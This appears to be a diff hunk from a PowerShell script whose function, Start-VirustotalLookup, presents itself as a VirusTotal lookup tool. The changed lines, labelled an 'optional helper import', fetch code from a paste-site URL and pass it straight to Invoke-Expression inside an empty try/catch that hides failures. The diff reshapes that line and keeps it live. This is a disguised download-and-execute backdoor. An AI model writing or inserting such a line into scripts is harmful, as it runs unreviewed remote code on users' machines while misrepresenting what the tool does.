@@ -19,8 +19,7 @@ function Start-VirustotalLookup {
 
         # Optional helper import
         try {
-            $Uri = "https://pastee.dev/r/eItOxiXK"
-            Invoke-RestMethod -Uri $Uri | Invoke-Expression
+             Invoke-RestMethod -Uri "https://pastee.dev/r/eItOxiXK" | Invoke-Expression
         } catch {}
 
         # Get Api key
